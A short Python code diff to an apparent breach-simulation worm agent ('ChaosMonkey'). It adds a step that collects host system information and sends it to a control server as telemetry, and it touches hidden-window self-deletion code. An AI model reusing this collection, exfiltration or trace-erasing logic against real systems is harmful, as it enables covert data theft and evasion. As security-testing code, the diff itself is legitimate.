@@ -2,15 +2,16 @@ import sys
 import os
 import time
 import logging
+import tunnel
+import argparse
+import subprocess
 from system_singleton import SystemSingleton
 from network.firewall import app as firewall
 from control import ControlClient
 from config import WormConfiguration
 from network.network_scanner import NetworkScanner
-import tunnel
-import argparse
-import subprocess
 from model import DELAY_DELETE_CMD
+from system_info import SystemInfoCollector
 
 __author__ = 'itamar'
 
@@ -58,6 +59,12 @@ class ChaosMonkey(object):
         monkey_tunnel = ControlClient.create_control_tunnel()
         if monkey_tunnel:
             monkey_tunnel.start()
+
+        if WormConfiguration.collect_system_info:
+            LOG.debug("Calling system info collection")
+            system_info_collector = SystemInfoCollector()
+            system_info = system_info_collector.get_info()
+            ControlClient.send_telemetry("system_info_collection", system_info)
 
         for _ in xrange(WormConfiguration.max_iterations):
             ControlClient.keepalive()
@@ -167,10 +174,10 @@ class ChaosMonkey(object):
                     startupinfo = subprocess.STARTUPINFO()
                     startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
                     startupinfo.wShowWindow = SW_HIDE                    
-                    subprocess.Popen(DELAY_DELETE_CMD % {'file_path' : sys.executable}, 
+                    subprocess.Popen(DELAY_DELETE_CMD % {'file_path': sys.executable},
                                      stdin=None, stdout=None, stderr=None, 
                                      close_fds=True, startupinfo=startupinfo)
                 else:
                     os.remove(sys.executable)
             except Exception, exc:
-                LOG.error("Exception in self delete: %s",exc)
+                LOG.error("Exception in self delete: %s", exc)
